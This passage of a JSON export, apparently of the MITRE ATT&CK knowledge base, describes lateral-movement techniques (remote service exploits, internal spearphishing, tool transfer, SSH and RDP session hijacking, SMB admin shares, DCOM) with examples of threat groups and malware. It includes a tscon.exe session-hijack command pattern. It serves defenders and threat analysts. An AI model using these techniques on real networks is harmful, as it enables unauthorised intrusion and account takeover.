servers."}, {"id": "G1006", "name": "Earth Lusca", "description": "Earth Lusca has used Mimikatz to exploit a domain controller via the ZeroLogon exploit (CVE-2020-1472)."}, {"id": "G1003", "name": "Ember Bear", "description": "Ember Bear has used exploits for vulnerabilities such as MS17-010, also known as Eternal Blue, during operations."}, {"id": "S0367", "name": "Emotet", "description": "Emotet has been seen exploiting SMB via a vulnerability exploit like EternalBlue (MS17-010) to achieve lateral movement and propagation."}, {"id": "S0363", "name": "Empire", "description": "Empire has a limited number of built-in modules for exploiting remote SMB, JBoss, and Jenkins servers."}, {"id": "G0046", "name": "FIN7", "description": "FIN7 has exploited ZeroLogon (CVE-2020-1472) against vulnerable domain controllers."}, {"id": "S0143", "name": "Flame", "description": "Flame can use MS10-061 to exploit a print spooler vulnerability in a remote system with a shared printer in order to move laterally."}, {"id": "G0117", "name": "Fox Kitten", "description": "Fox Kitten has exploited known vulnerabilities in remote services including RDP."}, {"id": "S0260", "name": "InvisiMole", "description": "InvisiMole can spread within a network via the BlueKeep (CVE-2019-0708) and EternalBlue (CVE-2017-0144) vulnerabilities in RDP and SMB respectively."}, {"id": "S0532", "name": "Lucifer", "description": "Lucifer can exploit multiple vulnerabilities including EternalBlue (CVE-2017-0144) and EternalRomance (CVE-2017-0144)."}, {"id": "G0045", "name": "menuPass", "description": "menuPass has used tools to exploit the ZeroLogon vulnerability (CVE-2020-1472)."}, {"id": "G0069", "name": "MuddyWater", "description": "MuddyWater has exploited the Microsoft Netlogon vulnerability (CVE-2020-1472)."}, {"id": "S0368", "name": "NotPetya", "description": "NotPetya can use two exploits in SMBv1, EternalBlue and EternalRomance, to spread itself to other remote systems on the network."}, {"id": "S0378", "name": "PoshC2", "description": "PoshC2 contains a module for exploiting SMB via EternalBlue."}, {"id": "S0650", "name": "QakBot", "description": "QakBot can move laterally using worm-like functionality through exploitation of SMB."}, {"id": "S0603", "name": "Stuxnet", "description": "Stuxnet propagates using the MS10-061 Print Spooler and MS08-067 Windows Server Service vulnerabilities."}, {"id": "G0027", "name": "Threat Group-3390", "description": "Threat Group-3390 has exploited MS17-010 to move laterally to other systems on the network."}, {"id": "G0131", "name": "Tonto Team", "description": "Tonto Team has used EternalBlue exploits for lateral movement."}, {"id": "S0266", "name": "TrickBot", "description": "TrickBot utilizes EternalBlue and EternalRomance exploits for lateral movement in the modules wormwinDll, wormDll, mwormDll, nwormDll, tabDll."}, {"id": "S0366", "name": "WannaCry", "description": "WannaCry uses an exploit in SMBv1 to spread itself to other remote systems on a network."}, {"id": "G0102", "name": "Wizard Spider", "description": "Wizard Spider has exploited or attempted to exploit Zerologon (CVE-2020-1472) and EternalBlue (MS17-010) vulnerabilities."}], "sub_techniques": []}, {"name": "Internal Spearphishing", "description": "After they already have access to accounts or systems within the environment, adversaries may use internal spearphishing to gain access to additional information or compromise other users within the same organization. Internal spearphishing is multi-staged campaign where a legitimate account is initially compromised either by controlling the user's device or by compromising the account credentials of the user. Adversaries may then attempt to take advantage of the trusted internal account to increase the likelihood of tricking more victims into falling for phish attempts, often incorporating Impersonation.", "detailed_description": "After they already have access to accounts or systems within the environment, adversaries may use internal spearphishing to gain access to additional information or compromise other users within the same organization. Internal spearphishing is multi-staged campaign where a legitimate account is initially compromised either by controlling the user's device or by compromising the account credentials of the user. Adversaries may then attempt to take advantage of the trusted internal account to increase the likelihood of tricking more victims into falling for phish attempts, often incorporating Impersonation.\nFor example, adversaries may leverage Spearphishing Attachment or Spearphishing Link as part of internal spearphishing to deliver a payload or redirect to an external site to capture credentials through Input Capture on sites that mimic login interfaces.\nAdversaries may also leverage internal chat apps, such as Microsoft Teams, to spread malicious content or engage users in attempts to capture sensitive information and/or credentials.", "id": "T1534", "examples": [{"id": "G0047", "name": "Gamaredon Group", "description": "Gamaredon Group has used an Outlook VBA module on infected systems to send phishing emails with malicious attachments to other employees within the organization."}, {"id": "G1001", "name": "HEXANE", "description": "HEXANE has conducted internal spearphishing attacks against executives, HR, and IT personnel to gain information and access."}, {"id": "G0094", "name": "Kimsuky", "description": "Kimsuky has sent internal spearphishing emails for lateral movement after stealing victim information."}, {"id": "G0065", "name": "Leviathan", "description": "Leviathan has conducted internal spearphishing within the victim's environment for lateral movement."}, {"id": "C0022", "name": "Operation Dream Job", "description": "During Operation Dream Job, Lazarus Group conducted internal spearphishing from within a compromised organization."}], "sub_techniques": []}, {"name": "Lateral Tool Transfer", "description": "Adversaries may transfer tools or other files between systems in a compromised environment. Once brought into the victim environment (i.e., Ingress Tool Transfer) files may then be copied from one system to another to stage adversary tools or other files over the course of an operation.", "detailed_description": "Adversaries may transfer tools or other files between systems in a compromised environment. Once brought into the victim environment (i.e., Ingress Tool Transfer) files may then be copied from one system to another to stage adversary tools or other files over the course of an operation.\nAdversaries may copy files between internal victim systems to support lateral movement using inherent file sharing protocols such as file sharing over SMB/Windows Admin Shares to connected network shares or with authenticated connections via Remote Desktop Protocol.\nFiles can also be transferred using native or otherwise present tools on the victim system, such as scp, rsync, curl, sftp, and ftp. In some cases, adversaries may be able to leverage Web Services such as Dropbox or OneDrive to copy files from one machine to another via shared, automatically synced folders.", "id": "T1570", "examples": [{"id": "C0028", "name": "2015 Ukraine Electric Power Attack", "description": "During the 2015 Ukraine Electric Power Attack, Sandworm Team moved their tools laterally within the corporate network and between the ICS and corporate network. "}, {"id": "C0025", "name": "2016 Ukraine Electric Power Attack", "description": "During the 2016 Ukraine Electric Power Attack, Sandworm Team used move to transfer files to a network share."}, {"id": "C0034", "name": "2022 Ukraine Electric Power Attack", "description": "During the 2022 Ukraine Electric Power Attack, Sandworm Team used a Group Policy Object (GPO) to copy CaddyWiper's executable msserver.exe from a staging server to a local hard drive before deployment."}, {"id": "G1030", "name": "Agrius", "description": "Agrius downloaded some payloads for follow-on execution from legitimate filesharing services such as ufile.io and easyupload.io."}, {"id": "G1007", "name": "Aoqin Dragon", "description": "Aoqin Dragon has spread malware in target networks by copying modules to folders masquerading as removable devices."}, {"id": "G0050", "name": "APT32", "description": "APT32 has deployed tools after moving laterally using administrative accounts."}, {"id": "G0096", "name": "APT41", "description": "APT41 uses remote shares to move and remotely execute payloads during lateral movemement."}, {"id": "S0190", "name": "BITSAdmin", "description": "BITSAdmin can be used to create BITS Jobs to upload and/or download files from SMB file servers."}, {"id": "S1068", "name": "BlackCat", "description": "BlackCat can replicate itself across connected servers via psexec."}, {"id": "C0015", "name": "C0015", "description": "During C0015, the threat actors used WMI to load Cobalt Strike onto additional hosts within a compromised network."}, {"id": "C0018", "name": "C0018", "description": "During C0018, the threat actors transferred the SoftPerfect Network Scanner and other tools to machines in the network using AnyDesk and PDQ Deploy."}, {"id": "G0114", "name": "Chimera", "description": "Chimera has copied tools between compromised hosts using SMB."}, {"id": "S0106", "name": "cmd", "description": "cmd can be used to copy files to/from a remotely connected internal system."}, {"id": "S0062", "name": "DustySky", "description": "DustySky searches for network drives and removable media and duplicates itself onto them."}, {"id": "G1003", "name": "Ember Bear", "description": "Ember Bear retrieves follow-on payloads direct from adversary-owned infrastructure for deployment on compromised hosts."}, {"id": "S0367", "name": "Emotet", "description": "Emotet has copied itself to remote systems using the service.exe filename."}, {"id": "S0404", "name": "esentutl", "description": "esentutl can be used to copy files to/from a remote share."}, {"id": "S0361", "name": "Expand", "description": "Expand can be used to download or upload a file over a network share."}, {"id": "G0051", "name": "FIN10", "description": "FIN10 has deployed Meterpreter stagers and SplinterRAT instances in the victim network after moving laterally."}, {"id": "S0095", "name": "ftp", "description": "ftp may be abused by adversaries to transfer tools or files between systems within a compromised environment."}, {"id": "G0093", "name": "GALLIUM", "description": "GALLIUM has used PsExec to move laterally between hosts in the target network."}, {"id": "S0698", "name": "HermeticWizard", "description": "HermeticWizard can copy files to other machines on a compromised network."}, {"id": "C0038", "name": "HomeLand Justice", "description": "During HomeLand Justice, threat actors initiated a process named Mellona.exe to spread the ROADSWEEP file encryptor and a persistence script to a list of internal machines."}, {"id": "G1032", "name": "INC Ransom", "description": "INC Ransom has used a rapid succession of copy commands to install a file encryption executable across multiple endpoints within compromised infrastructure."}, {"id": "S1139", "name": "INC Ransomware", "description": "INC Ransomware can push its encryption executable to multiple endpoints within compromised infrastructure."}, {"id": "S1132", "name": "IPsec Helper", "description": "IPsec Helper can download additional payloads from command and control nodes and execute them."}, {"id": "S0372", "name": "LockerGoga", "description": "LockerGoga has been observed moving around the victim network via SMB, indicating the actors behind this ransomware are manually copying files form computer to computer instead of self-propagating."}, {"id": "S0532", "name": "Lucifer", "description": "Lucifer can use certutil for propagation on Windows hosts within intranets."}, {"id": "G0059", "name": "Magic Hound", "description": "Magic Hound has copied tools within a compromised network using RDP."}, {"id": "S0457", "name": "Netwalker", "description": "Operators deploying Netwalker have used psexec to copy the Netwalker payload across accessible systems."}, {"id": "S0365", "name": "Olympic Destroyer", "description": "Olympic Destroyer attempts to copy itself to remote machines on the network."}, {"id": "C0014", "name": "Operation Wocao", "description": "During Operation Wocao, threat actors used SMB to copy files to and from target systems."}, {"id": "S1017", "name": "OutSteel", "description": "OutSteel can download the Saint Bot malware for follow-on execution."}, {"id": "S0029", "name": "PsExec", "description": "PsExec can be used to download or upload a file over a network share."}, {"id": "G0034", "name": "Sandworm Team", "description": "Sandworm Team has used move to transfer files to a network share and has copied payloads--such as Prestige ransomware--to an Active Directory Domain Controller and distributed via the Default Domain Group Policy Object. Additionally, Sandworm Team has transferred an ISO file into the OT network to gain initial access."}, {"id": "S0140", "name": "Shamoon", "description": "Shamoon attempts to copy itself to remote machines on the network."}, {"id": "S0603", "name": "Stuxnet", "description": "Stuxnet uses an RPC server that contains a file dropping routine and support for payload version updates for P2P communications within a victim network."}, {"id": "G0010", "name": "Turla", "description": "Turla RPC backdoors can be used to transfer files to/from victim machines on the local network."}, {"id": "G1017", "name": "Volt Typhoon", "description": "Volt Typhoon has copied web shells between servers in targeted environments."}, {"id": "S0366", "name": "WannaCry", "description": "WannaCry attempts to copy itself to remote computers after gaining access via an SMB exploit."}, {"id": "G0102", "name": "Wizard Spider", "description": "Wizard Spider has used stolen credentials to copy tools into the %TEMP% directory of domain controllers."}], "sub_techniques": []}, {"name": "Remote Service Session Hijacking", "description": "Adversaries may take control of preexisting sessions with remote services to move laterally in an environment. Users may use valid credentials to log into a service specifically designed to accept remote connections, such as telnet, SSH, and RDP. When a user logs into a service, a session will be established that will allow them to maintain a continuous interaction with that service.", "detailed_description": "Adversaries may take control of preexisting sessions with remote services to move laterally in an environment. Users may use valid credentials to log into a service specifically designed to accept remote connections, such as telnet, SSH, and RDP. When a user logs into a service, a session will be established that will allow them to maintain a continuous interaction with that service.\nAdversaries may commandeer these sessions to carry out actions on remote systems. Remote Service Session Hijacking differs from use of Remote Services because it hijacks an existing session rather than creating a new session using Valid Accounts.", "id": "T1563", "examples": [], "sub_techniques": [{"name": "SSH Hijacking", "description": "Adversaries may hijack a legitimate user's SSH session to move laterally within an environment. Secure Shell (SSH) is a standard means of remote access on Linux and macOS systems. It allows a user to connect to another system via an encrypted tunnel, commonly authenticating through a password, certificate or the use of an asymmetric encryption key pair.", "detailed_description": "Adversaries may hijack a legitimate user's SSH session to move laterally within an environment. Secure Shell (SSH) is a standard means of remote access on Linux and macOS systems. It allows a user to connect to another system via an encrypted tunnel, commonly authenticating through a password, certificate or the use of an asymmetric encryption key pair.\nIn order to move laterally from a compromised host, adversaries may take advantage of trust relationships established with other systems via public key authentication in active SSH sessions by hijacking an existing connection to another system. This may occur through compromising the SSH agent itself or by having access to the agent's socket. If an adversary is able to obtain root access, then hijacking SSH sessions is likely trivial.\nSSH Hijacking differs from use of SSH because it hijacks an existing SSH session rather than creating a new session using Valid Accounts.", "id": "T1563.001", "examples": []}, {"name": "RDP Hijacking", "description": "Adversaries may hijack a legitimate user\u2019s remote desktop session to move laterally within an environment. Remote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS).", "detailed_description": "Adversaries may hijack a legitimate user\u2019s remote desktop session to move laterally within an environment. Remote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS).\nAdversaries may perform RDP session hijacking which involves stealing a legitimate user's remote session. Typically, a user is notified when someone else is trying to steal their session. With System permissions and using Terminal Services Console, c:\\windows\\system32\\tscon.exe [session number to be stolen], an adversary can hijack a session without the need for credentials or prompts to the user. This can be done remotely or locally and with active or disconnected sessions. It can also lead to Remote System Discovery and Privilege Escalation by stealing a Domain Admin or higher privileged account session. All of this can be done by using native Windows commands, but it has also been added as a feature in red teaming tools.", "id": "T1563.002", "examples": [{"id": "G0001", "name": "Axiom", "description": "Axiom has targeted victims with remote administration tools including RDP."}, {"id": "S0366", "name": "WannaCry", "description": "WannaCry enumerates current remote desktop sessions and tries to execute the malware on each session."}]}]}, {"name": "Remote Services", "description": "Adversaries may use Valid Accounts to log into a service that accepts remote connections, such as telnet, SSH, and VNC. The adversary may then perform actions as the logged-on user.", "detailed_description": "Adversaries may use Valid Accounts to log into a service that accepts remote connections, such as telnet, SSH, and VNC. The adversary may then perform actions as the logged-on user.\nIn an enterprise environment, servers and workstations can be organized into domains. Domains provide centralized identity management, allowing users to login using one set of credentials across the entire network. If an adversary is able to obtain a set of valid domain credentials, they could login to many different machines using remote access protocols such as secure shell (SSH) or remote desktop protocol (RDP). They could also login to accessible SaaS or IaaS services, such as those that federate their identities to the domain.\nLegitimate applications (such as Software Deployment Tools and other administrative programs) may utilize Remote Services to access remote hosts. For example, Apple Remote Desktop (ARD) on macOS is native software used for remote management. ARD leverages a blend of protocols, including VNC to send the screen and control buffers and SSH for secure file transfer. Adversaries can abuse applications such as ARD to gain remote code execution and perform lateral movement. In versions of macOS prior to 10.14, an adversary can escalate an SSH session to an ARD session which enables an adversary to accept TCC (Transparency, Consent, and Control) prompts without user interaction and gain access to data.", "id": "T1021", "examples": [{"id": "G0143", "name": "Aquatic Panda", "description": "Aquatic Panda used remote scheduled tasks to install malicious software on victim systems during lateral movement actions."}, {"id": "S1063", "name": "Brute Ratel C4", "description": "Brute Ratel C4 has the ability to use RPC for lateral movement."}, {"id": "G1003", "name": "Ember Bear", "description": "Ember Bear uses valid network credentials gathered through credential harvesting to move laterally within victim networks, often employing the Impacket framework to do so."}, {"id": "S0437", "name": "Kivars", "description": "Kivars has the ability to remotely trigger keyboard input and mouse clicks. "}, {"id": "S1016", "name": "MacMa", "description": "MacMa can manage remote screen sessions."}, {"id": "S0603", "name": "Stuxnet", "description": "Stuxnet can propagate via peer-to-peer communication and updates using RPC."}, {"id": "G0102", "name": "Wizard Spider", "description": "Wizard Spider has used the WebDAV protocol to execute Ryuk payloads hosted on network file shares."}], "sub_techniques": [{"name": "Remote Desktop Protocol", "description": "Adversaries may use Valid Accounts to log into a computer using the Remote Desktop Protocol (RDP). The adversary may then perform actions as the logged-on user.", "detailed_description": "Adversaries may use Valid Accounts to log into a computer using the Remote Desktop Protocol (RDP). The adversary may then perform actions as the logged-on user.\nRemote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS).\nAdversaries may connect to a remote system over RDP/RDS to expand access if the service is enabled and allows access to accounts with known credentials. Adversaries will likely use Credential Access techniques to acquire credentials to use with RDP. Adversaries may also use RDP in conjunction with the Accessibility Features or Terminal Services DLL for Persistence.", "id": "T1021.001", "examples": [{"id": "G1030", "name": "Agrius", "description": "Agrius tunnels RDP traffic through deployed web shells to access victim environments via compromised accounts. Agrius used the Plink tool to tunnel RDP connections for remote access and lateral movement in victim environments."}, {"id": "G0006", "name": "APT1", "description": "The APT1 group is known to have used RDP during operations."}, {"id": "G0022", "name": "APT3", "description": "APT3 enables the Remote Desktop Protocol for persistence. APT3 has also interacted with compromised systems to browse and copy files through RDP sessions."}, {"id": "G0087", "name": "APT39", "description": "APT39 has been seen using RDP for lateral movement and persistence, in some cases employing the rdpwinst tool for mangement of multiple sessions."}, {"id": "G0096", "name": "APT41", "description": "APT41 used RDP for lateral movement. APT41 used NATBypass to expose local RDP ports on compromised systems to the Internet."}, {"id": "G1023", "name": "APT5", "description": "APT5 has moved laterally throughout victim environments using RDP."}, {"id": "G0143", "name": "Aquatic Panda", "description": "Aquatic Panda leveraged stolen credentials to move laterally via RDP in victim environments."}, {"id": "G0001", "name": "Axiom", "description": "Axiom has used RDP during operations."}, {"id": "G0108", "name": "Blue Mockingbird", "description": "Blue Mockingbird has used Remote Desktop to log on to servers interactively and manually copy files to remote hosts."}, {"id": "C0015", "name": "C0015", "description": "During C0015, the threat actors used RDP to access specific network hosts of interest."}, {"id": "C0018", "name": "C0018", "description": "During C0018, the threat actors opened a variety of ports to establish RDP connections, including ports 28035, 32467, 41578, and 46892."}, {"id": "C0032", "name": "C0032", "description": "During the C0032 campaign, TEMP.Veles utilized RDP throughout an operation."}, {"id": "S0030", "name": "Carbanak", "description": "Carbanak enables concurrent Remote Desktop Protocol (RDP) sessions."}, {"id": "G0114", "name": "Chimera", "description": "Chimera has used RDP to access targeted systems."}, {"id": "G0080", "name": "Cobalt Group", "description": "Cobalt Group has used Remote Desktop Protocol to conduct lateral movement."}, {"id": "S0154", "name": "Cobalt Strike", "description": "Cobalt Strike can start a VNC-based remote desktop server and tunnel the connection through the already established C2 channel."}, {"id": "C0029", "name": "Cutting Edge", "description": "During Cutting Edge, threat actors used RDP with compromised credentials for lateral movement."}, {"id": "S0334", "name": "DarkComet", "description": "DarkComet can open an active screen of the victim\u2019s machine and take control of the mouse and keyboard."}, {"id": "G0035", "name": "Dragonfly", "description": "Dragonfly has moved laterally via RDP."}, {"id": "G0051", "name": "FIN10", "description": "FIN10 has used RDP to move laterally to systems in the victim environment."}, {"id": "G1016", "name": "FIN13", "description": "FIN13 has remotely accessed compromised environments via Remote Desktop Services (RDS) for lateral movement."}, {"id": "G0037", "name": "FIN6", "description": "FIN6 used RDP to move laterally in victim networks."}, {"id": "G0046", "name": "FIN7", "description": "FIN7 has used RDP to move laterally in victim environments."}, {"id": "G0061", "name": "FIN8", "description": "FIN8 has used RDP for lateral movement."}, {"id": "G0117", "name": "Fox Kitten", "description": "Fox Kitten has used RDP to log in and move laterally in the target environment."}, {"id": "G1001", "name": "HEXANE", "description": "HEXANE has used remote desktop sessions for lateral movement."}, {"id": "C0038", "name": "HomeLand Justice", "description": "During HomeLand Justice, threat actors primarily used RDP for lateral movement in the victim environment."}, {"id": "S0434", "name": "Imminent Monitor", "description": "Imminent Monitor has a module for performing remote desktop access."}, {"id": "G1032", "name": "INC Ransom", "description": "INC Ransom has used RDP to move laterally."}, {"id": "G0119", "name": "Indrik Spider", "description": "Indrik Spider has used RDP for lateral movement."}, {"id": "S0283", "name": "jRAT", "description": "jRAT can support RDP control."}, {"id": "G0094", "name": "Kimsuky", "description": "Kimsuky has used RDP for direct remote point-and-click access."}, {"id": "S0250", "name": "Koadic", "description": "Koadic can enable remote desktop on the victim's machine."}, {"id": "G0032", "name": "Lazarus Group", "description": "Lazarus Group malware SierraCharlie uses RDP for propagation."}, {"id": "G0065", "name": "Leviathan", "description": "Leviathan has targeted RDP credentials and used it to move through the victim environment."}, {"id": "G0059", "name": "Magic Hound", "description": "Magic Hound has used Remote Desktop Services to copy tools on targeted systems."}, {"id": "G0045", "name": "menuPass", "description": "menuPass has used RDP connections to move across the victim network."}, {"id": "S0385", "name": "njRAT", "description": "njRAT has a module for performing remote desktop access."}, {"id": "G0049", "name": "OilRig", "description": "OilRig has used Remote Desktop Protocol for lateral movement. The group has also used tunneling tools to tunnel RDP into the environment."}, {"id": "G0040", "name": "Patchwork", "description": "Patchwork attempted to use RDP to move laterally."}, {"id": "S0192", "name": "Pupy", "description": "Pupy can enable/disable RDP connection and can start a remote desktop session using a browser web socket client."}, {"id": "S0583", "name": "Pysa", "description": "Pysa has laterally moved using RDP connections."}, {"id": "S0262", "name": "QuasarRAT", "description": "QuasarRAT has a module for performing remote desktop access."}, {"id": "S0379", "name": "Revenge RAT", "description": "Revenge RAT has a plugin to perform RDP access."}, {"id": "S0461", "name": "SDBbot", "description": "SDBbot has the ability to use RDP to connect to victim's machines."}, {"id": "S0382", "name": "ServHelper", "description": "ServHelper has commands for adding a remote desktop user and sending RDP traffic to the attacker through a reverse SSH tunnel."}, {"id": "G0091", "name": "Silence", "description": "Silence has used RDP for lateral movement."}, {"id": "C0024", "name": "SolarWinds Compromise", "description": "During the SolarWinds Compromise, APT29 used RDP sessions from public-facing systems to internal servers."}, {"id": "G1017", "name": "Volt Typhoon", "description": "Volt Typhoon has moved laterally to the Domain Controller via RDP using a compromised account with domain administrator privileges."}, {"id": "S0670", "name": "WarzoneRAT", "description": "WarzoneRAT has the ability to control an infected PC using RDP."}, {"id": "G0102", "name": "Wizard Spider", "description": "Wizard Spider has used RDP for lateral movement and to deploy ransomware interactively."}, {"id": "S0350", "name": "zwShell", "description": "zwShell has used RDP for lateral movement."}, {"id": "S0412", "name": "ZxShell", "description": "ZxShell has remote desktop functionality."}]}, {"name": "SMB/Windows Admin Shares", "description": "Adversaries may use Valid Accounts to interact with a remote network share using Server Message Block (SMB). The adversary may then perform actions as the logged-on user.", "detailed_description": "Adversaries may use Valid Accounts to interact with a remote network share using Server Message Block (SMB). The adversary may then perform actions as the logged-on user.\nSMB is a file, printer, and serial port sharing protocol for Windows machines on the same network or domain. Adversaries may use SMB to interact with file shares, allowing them to move laterally throughout a network. Linux and macOS implementations of SMB typically use Samba.\nWindows systems have hidden network shares that are accessible only to administrators and provide the ability for remote file copy and other administrative functions. Example network shares include C$, ADMIN$, and IPC$. Adversaries may use this technique in conjunction with administrator-level Valid Accounts to remotely access a networked system over SMB, to interact with systems using remote procedure calls (RPCs), transfer files, and run transferred binaries through remote Execution. Example execution techniques that rely on authenticated sessions over SMB/RPC are Scheduled Task/Job, Service Execution, and Windows Management Instrumentation. Adversaries can also use NTLM hashes to access administrator shares on systems with Pass the Hash and certain configuration and patch levels.", "id": "T1021.002", "examples": [{"id": "C0025", "name": "2016 Ukraine Electric Power Attack", "description": "During the 2016 Ukraine Electric Power Attack, Sandworm Team utilized net use to connect to network shares."}, {"id": "S0504", "name": "Anchor", "description": "Anchor can support windows execution via SMB shares."}, {"id": "G0007", "name": "APT28", "description": "APT28 has mapped network drives using Net and administrator credentials."}, {"id": "G0022", "name": "APT3", "description": "APT3 will copy files over to Windows Admin Shares (like ADMIN$) as part of lateral movement."}, {"id": "G0050", "name": "APT32", "description": "APT32 used Net to use Windows' hidden network shares to copy their tools to remote machines for execution."}, {"id": "G0087", "name": "APT39", "description": "APT39 has used SMB for lateral movement."}, {"id": "G0096", "name": "APT41", "description": "APT41 has transferred implant files using Windows Admin Shares and the Server Message Block (SMB) protocol, then executes files through Windows Management Instrumentation (WMI)."}, {"id": "G0143", "name": "Aquatic Panda", "description": "Aquatic Panda used remote shares to enable lateral movement in victim environments."}, {"id": "S0089", "name": "BlackEnergy", "description": "BlackEnergy has run a plug-in on a victim to spread through the local network by using PsExec and accessing admin shares."}, {"id": "G0108", "name": "Blue Mockingbird", "description": "Blue Mockingbird has used Windows Explorer to manually copy malicious files to remote hosts over SMB."}, {"id": "S1063", "name": "Brute Ratel C4", "description": "Brute Ratel C4 has the ability to use SMB to pivot in compromised networks."}, {"id": "G0114", "name": "Chimera", "description": "Chimera has used Windows admin shares to move laterally."}, {"id": "G1021", "name": "Cinnamon Tempest", "description": "Cinnamon Tempest has used SMBexec for lateral movement."}, {"id": "S0154", "name": "Cobalt Strike", "description": "Cobalt Strike can use Window admin shares (C$ and ADMIN$) for lateral movement."}, {"id": "S0608", "name": "Conficker", "description": "Conficker variants spread through NetBIOS share propagation."}, {"id": "S0575", "name": "Conti", "description": "Conti can spread via SMB and encrypts files on different hosts, potentially compromising an entire network."}, {"id": "C0029", "name": "Cutting Edge", "description": "During Cutting Edge, threat actors moved laterally using compromised credentials to connect to internal Windows systems with SMB."}, {"id": "G0009", "name": "Deep Panda", "description": "Deep Panda uses net.exe to connect to network shares using net use commands with compromised credentials."}, {"id": "S0659", "name": "Diavol", "description": "Diavol can spread throughout a network via SMB prior to encryption."}, {"id": "S0038", "name": "Duqu", "description": "Adversaries can instruct Duqu to spread laterally by copying itself to shares it has enumerated and for which it has obtained legitimate credentials (via keylogging or other means). The remote host is then infected by using the compromised credentials to schedule a task on remote machines that executes the malware."}, {"id": "S0367", "name": "Emotet", "description": "Emotet has leveraged the Admin$, C$, and IPC$ shares for lateral movement. "}, {"id": "G1016", "name": "FIN13", "description": "FIN13 has leveraged SMB to move laterally within a compromised network via application servers and SQL servers."}, {"id": "G0061", "name": "FIN8", "description": "FIN8 has attempted to map to C$ on enumerated hosts to test the scope of their current credentials/context. FIN8 has also used smbexec from the Impacket suite for lateral movement."}, {"id": "G0117", "name": "Fox Kitten", "description": "Fox Kitten has used valid accounts to access SMB shares."}, {"id": "S0698", "name": "HermeticWizard", "description": "HermeticWizard can use a list of hardcoded credentials to to authenticate via NTLMSSP to the SMB shares on remote systems."}, {"id": "C0038", "name": "HomeLand Justice", "description": "During HomeLand Justice, threat actors used SMB for lateral movement."}, {"id": "G0004", "name": "Ke3chang", "description": "Ke3chang actors have been known to copy files to the network shares of other computers to move laterally."}, {"id": "S0236", "name": "Kwampirs", "description": "Kwampirs copies itself over network shares to move laterally on a victim network."}, {"id": "G0032", "name": "Lazarus Group", "description": "Lazarus Group malware SierraAlfa accesses the ADMIN$ share via SMB to conduct lateral movement."}, {"id": "S0532", "name": "Lucifer", "description": "Lucifer can infect victims by brute forcing SMB."}, {"id": "G1009", "name": "Moses Staff", "description": "Moses Staff has used batch scripts that can enable SMB on a compromised host."}, {"id": "S0039", "name": "Net", "description": "Lateral movement can be done with Net through net use commands to connect to the on remote systems."}, {"id": "S0056", "name": "Net Crawler", "description": "Net Crawler uses Windows admin shares to establish authenticated sessions to remote systems over SMB as part of lateral movement."}, {"id": "S0368", "name": "NotPetya", "description": "NotPetya can use PsExec, which interacts with the ADMIN$ network share to execute commands on remote systems."}, {"id": "S0365", "name": "Olympic Destroyer", "description": "Olympic Destroyer uses PsExec to interact with the ADMIN$ network share to execute commands on remote systems."}, {"id": "C0014", "name": "Operation Wocao", "description": "During Operation Wocao, threat actors used Impacket's smbexec.py as well as accessing the C$ and IPC$ shares to move laterally."}, {"id": "G0071", "name": "Orangeworm", "description": "Orangeworm has copied its backdoor across open network shares, including ADMIN$, C$WINDOWS, D$WINDOWS, and E$WINDOWS."}, {"id": "G1040", "name": "Play", "description": "Play has used Cobalt Strike to move laterally via SMB."}, {"id": "S0029", "name": "PsExec", "description": "PsExec, a tool that has been used by adversaries, writes programs to the ADMIN$ network share to execute commands on remote systems."}, {"id": "S0019", "name": "Regin", "description": "The Regin malware platform can use Windows admin shares to move laterally."}, {"id": "S1073", "name": "Royal", "description": "Royal can use SMB to connect to move laterally."}, {"id": "S0446", "name": "Ryuk", "description": "Ryuk has used the C$ network share for lateral movement."}, {"id": "G0034", "name": "Sandworm Team", "description": "Sandworm Team has copied payloads to the ADMIN$ share of remote systems and run net use to connect to network shares."}, {"id": "S0140", "name": "Shamoon", "description": "Shamoon accesses network share(s), enables share access to the target device, copies an executable payload to the target system, and uses a Scheduled Task/Job to execute the malware."}, {"id": "C0024", "name": "SolarWinds Compromise", "description": "During the SolarWinds Compromise, APT29 used administrative accounts to connect over SMB to targeted users."}, {"id": "S0603", "name": "Stuxnet", "description": "Stuxnet propagates to available network shares."}, {"id": "G0028", "name": "Threat Group-1314", "description": "Threat Group-1314 actors mapped network drives using net use."}, {"id": "G1022", "name": "ToddyCat", "description": "ToddyCat has used locally mounted network shares for lateral movement through targated environments."}, {"id": "G0010", "name": "Turla", "description": "Turla used net use commands to connect to lateral systems within a network."}, {"id": "G0102", "name": "Wizard Spider", "description": "Wizard Spider has used SMB to drop Cobalt Strike Beacon on a domain controller for lateral movement."}, {"id": "S0672", "name": "Zox", "description": "Zox has the ability to use SMB for communication."}, {"id": "S0350", "name": "zwShell", "description": "zwShell has been copied over network shares to move laterally."}]}, {"name": "Distributed Component Object Model", "description": "Adversaries may use Valid Accounts to interact with remote machines by taking advantage of Distributed Component Object Model (DCOM). The adversary may then perform actions as the logged-on user.", "detailed_description": "Adversaries may use Valid Accounts to interact with remote machines by taking advantage of Distributed Component Object Model (DCOM). The adversary may then perform actions as the logged-on user.\nThe Windows Component Object Model (COM) is a component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces. Through COM, a client object can call methods of server objects, which are typically Dynamic Link Libraries (DLL) or executables (EXE). Distributed COM (DCOM) is transparent middleware that extends the functionality of COM beyond a local computer using remote procedure call (RPC) technology.\nPermissions to interact with local and remote server COM objects are specified by access control lists (ACL) in the Registry. By default, only Administrators may remotely activate and launch COM objects through DCOM.\nThrough DCOM, adversaries operating in the context of an appropriately privileged user can remotely obtain arbitrary and even direct shellcode execution through Office applications as well as other Windows objects that contain insecure methods. DCOM can also execute macros in existing documents and may also invoke Dynamic Data Exchange (DDE) execution directly through a COM created instance of a Microsoft Office application, bypassing the need for a malicious document. DCOM can be used as a method of remotely interacting with Windows Management Instrumentation.", "id": "T1021.003", "examples": [{"id": "S0154", "name": "Cobalt Strike", "description": "Cobalt Strike can deliver Beacon payloads for lateral movement by leveraging remote COM execution."}, {"id": "S0363", "name": "Empire", "description": "Empire can utilize Invoke-DCOM to leverage remote COM execution for lateral movement."}, {"id": "S0692", "name": "SILENTTRINITY", "description": "SILENTTRINITY can use System namespace methods to execute lateral movement using DCOM."}]}, {"name": 